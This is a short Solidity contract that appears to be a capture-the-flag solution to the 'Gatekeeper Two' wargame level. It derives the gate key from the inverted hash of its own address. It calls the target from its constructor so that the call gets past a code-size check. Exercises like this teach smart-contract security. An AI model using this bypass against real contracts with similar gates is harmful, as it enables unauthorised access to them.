// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8) external returns (bool);
}

contract GatekeeperTwoAttack {
    // call target contract within the constructor
    constructor(address _targetAddress) {
        bytes8 gateKey = bytes8(~keccak256(abi.encodePacked(address(this))));

        IGatekeeperTwo(_targetAddress).enter(gateKey);
    }
}
